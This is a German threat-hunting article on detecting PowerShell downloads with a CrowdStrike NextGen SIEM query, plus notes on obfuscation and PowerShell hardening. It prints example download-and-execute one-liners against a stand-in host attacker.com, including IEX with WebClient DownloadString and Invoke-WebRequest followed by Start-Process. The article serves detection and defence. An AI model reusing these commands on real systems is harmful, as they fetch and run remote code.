# Powershell Threat Hunting: Downloads erkennen mit NextGen SIEM

## Warum PowerShell für Angreifer interessant ist

PowerShell ist ein fester Bestandteil moderner Windows-Systeme und bietet durch .NET-Anbindung mächtige Möglichkeiten zur Automatisierung. Diese Eigenschaften machen es auch für Angreifer attraktiv:

- Auf jedem Windows-System vorhanden (kein zusätzlicher Code nötig)
- Direkter Zugriff auf Windows-APIs und Netzwerkressourcen
- Kann Code aus dem Speicher ausführen (*fileless execution*)
- Oft unzureichend überwacht oder eingeschränkt

**Living off the Land**-Taktiken nutzen PowerShell, um Angriffe unauffällig und ohne zusätzliche Tools durchzuführen.

---

## Warum nach PowerShell-Downloads suchen?
PowerShell wird häufig verwendet, um Dateien oder Skripte aus dem Internet zu laden – z. B. zur:

- Nachladung von Schadsoftware 
- Kommunikation mit Command-and-Control-Servern
- Umgehung traditioneller Sicherheitsmaßnahmen 

Einige Gründe für die proaktive Suche nach PowerShell-Downloads:

- Früherkennung von Angriffen im Initial Access oder Execution-Phase
- Erkennung von Fileless Malware

---

## Download via PowerShell

Angreifer nutzen verschiedene Techniken, um Inhalte via PowerShell herunterzuladen. 

### `Invoke-WebRequest` (IWR)
* Funktionalität: Dieses Cmdlet, verfügbar ab PowerShell Version 3, fungiert ähnlich wie `wget` oder `curl` unter Linux. Es sendet HTTP-, HTTPS- oder FTP-Anfragen an eine angegebene URL und kann die Antwort verarbeiten oder, mithilfe des Parameters `-OutFile`, direkt in eine Datei speichern. Es unterstützt komplexere Webinteraktionen wie Authentifizierung und benutzerdefinierte Header.
* Anwendungsfälle & Risiken: Legitim für Web-Scraping, Herunterladen von Ressourcen oder Interaktion mit APIs. Wird von Angreifern häufig zum Herunterladen von Payloads verwendet, oft in Kombination mit `-OutFile`, um die Datei auf der Festplatte zu speichern, oder die Ausgabe wird an `Invoke-Expression` (IEX) weitergeleitet, um eine dateilose Ausführung zu erreichen. `Invoke-WebRequest` kann relativ langsam sein und hat eine potenzielle Abhängigkeit von Internet Explorer-Komponenten.
  
* Sytaxbeispiel: 
```powershell
# Einfacher Download
Invoke-WebRequest -Uri "http://example.com/payload.exe" -OutFile "C:\Users\Public\payload.exe"

# Oft in Angriffen gesehen (vereinfacht)
# IWR lädt Datei herunter, dann wird sie ausgeführt
Invoke-WebRequest -Uri "http://attacker.com/payload.exe" -OutFile "$env:TEMP\p.exe"; Start-Process "$env:TEMP\p.exe"
```

###  `System.Net.WebClient` (.DownloadFile /.DownloadString)
* Funktionalität: Nutzt die .NET Framework-Klasse `System.Net.WebClient`. Bietet Methoden wie `DownloadFile`, die eine Datei von einer URL herunterlädt und auf der Festplatte speichert, und `DownloadString`, die den Inhalt einer Ressource direkt als Zeichenkette zurückgibt. `DownloadString` wird häufig in Kombination mit `Invoke-Expression` für die dateilose Ausführung von Skripten verwendet.
* Anwendungsfälle & Risiken: Legitim für programmgesteuerte Dateidownloads in Skripten. Wird von Angreifern intensiv missbraucht, sowohl zum Herunterladen ausführbarer Payloads (`DownloadFile`)  als auch zur dateilosen Ausführung (`DownloadString` + `IEX`). Ist mit Server Core kompatibel.   

* Sytaxbeispiel: 
```powershell
# Download in Datei
$client = New-Object System.Net.WebClient
$client.DownloadFile("http://example.com/payload.exe", "C:\Windows\Temp\payload.exe")

# Download String zur Ausführung
$payload = (New-Object System.Net.WebClient).DownloadString("http://attacker.com/malicious.ps1")
Invoke-Expression $payload

# Oft verkürzt / kombiniert:
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/malicious.ps1')
```

### `Start-BitsTransfer`
* Funktionalität: Verwendet den Background Intelligent Transfer Service (BITS), einen Windows-Dienst, der für asynchrone, gedrosselte und wiederaufnehmbare Dateiübertragungen konzipiert ist. Erfordert, dass der BITS-Dienst ausgeführt wird und das BitsTransfer-Modul importiert ist. Gut geeignet für große Dateien oder Hintergrundübertragungen.

* Anwendungsfälle & Risiken: Legitim für große Dateiübertragungen und Updates. Wird seltener für den initialen Zugriff durch Malware verwendet als IWR/WebClient, kann aber von Angreifern genutzt werden, um größere Werkzeuge, Payloads oder gestohlene Daten zu übertragen. Seine asynchrone Natur könnte zur Tarnung genutzt werden. Erfordert den BITS-Dienst; kann fehlschlagen, wenn der Dienst deaktiviert ist oder der Benutzer (abhängig von der Konfiguration) nicht angemeldet ist. 

* Syntaxbeispiel
```powershell
Import-Module BitsTransfer
Start-BitsTransfer -Source "[http://example.com/large_payload.zip](http://example.com/large_payload.zip)" -Destination "C:\Temp\large_payload.zip"
# Kann asynchron ausgeführt werden
Start-BitsTransfer -Source "http://..." -Destination "C:\..." -Asynchronous
```

## Verschleierungstechniken (MITRE ATT&CK T1027)
Angreifer verschleiern PowerShell-Befehle und -Skripte, um signaturbasierte Erkennungssysteme zu umgehen und die Analyse zu erschweren. Gängige Methoden umfassen:   

* Kodierung: Verwendung von Base64 (-EncodedCommand, -e, -ec), Hexadezimal oder ASCII zur Darstellung von Befehlen oder Skriptblöcken.   
* Zeichenkettenmanipulation: Verketten ("Down" + "loadString"), Neuanordnen ("{1}{0}" -f 'String','Download') oder Ersetzen von Zeichen innerhalb von Zeichenketten, um bekannte Muster zu zerlegen.   
* Variablenverschleierung: Verwendung unklarer Variablennamen oder das schrittweise Zusammenbauen von Befehlen in Variablen.   
* Escape-Zeichen: Einsatz von Backticks (`) innerhalb von Zeichenketten oder Befehlen, um die Lesbarkeit zu beeinträchtigen.   
* Zufällige Groß-/Kleinschreibung: Mischen von Groß- und Kleinbuchstaben.   
* Leerraum/Kommentare: Einfügen unnötiger Leerzeichen oder Kommentare.   
* Befehlsaliase/Kurznamen: Verwendung von Aliasen wie IEX für Invoke-Expression oder IWR für Invoke-WebRequest.   
* Umgebungsvariablen: Verstecken von Teilen des Codes in Umgebungsvariablen.   
* Typnamenverkürzung: Verwendung von Net.WebClient anstelle von System.Net.WebClient.

Für einige dieser Methoden haben wir eine separate Query erstellt, um gezielt nach Powershell Obfuscation zu suchen. 

## CrowdStrike NextGen SIEM Query
```
#event_simpleName=ProcessRollup2 event_platform=Win
| ImageFileName=/\\(powershell(_ise)?|pwsh)\.exe/i
| CommandLine=/Invoke\-WebRequest|Net\.WebClient|Start\-BitsTransfer/i
| regex("(?<URL>https?://[^'\"]+)", field=CommandLine)
| replace("https://", with="", field=Domain, as=vt_lookup)
| UrlBase:="https://www.virustotal.com/gui/domain/"
| format(format="[Virustotal](%s%s)", field=[UrlBase, vt_lookup], as=DomainLookup)
| table([DomainLookup, URL, ComputerName, UserName, CommandLine], limit=20000)
```

## Powershell Härtung implementieren
* Constrained Language Mode: Wo immer möglich, schränken Sie PowerShell auf den Constrained Language Mode ein. Dies begrenzt den Zugriff auf sensible Cmdlets,.NET-Typen und die Ausführung von beliebigem Code, was viele Angriffstechniken erschwert.   
* Just Enough Administration (JEA): Implementieren Sie JEA, um administrative Berechtigungen auf das absolut notwendige Minimum für bestimmte Rollen und Aufgaben zu beschränken. Dies reduziert die Auswirkungen, falls ein privilegiertes Konto kompromittiert wird.   
* Execution Policy: Setzen Sie die Ausführungsrichtlinie mindestens auf RemoteSigned oder AllSigned. Auch wenn dies keine undurchdringliche Sicherheitsbarriere darstellt, zwingt es Angreifer zur Verwendung von Bypass-Methoden (z.B. -ExecutionPolicy Bypass), deren Verwendung wiederum ein detektierbares Signal sein kann. Erzwingen Sie die Signierung für intern entwickelte Skripte.   
* Application Control: Nutzen Sie Lösungen wie AppLocker, um die Ausführung von PowerShell-Skripten auf autorisierte Benutzer, Systeme oder signierte Skripte zu beschränken. Das vollständige Blockieren von powershell.exe ist aufgrund seiner legitimen Verwendung und der Möglichkeit, die Engine auch ohne die EXE-Datei zu nutzen, oft nicht praktikabel oder effektiv.   
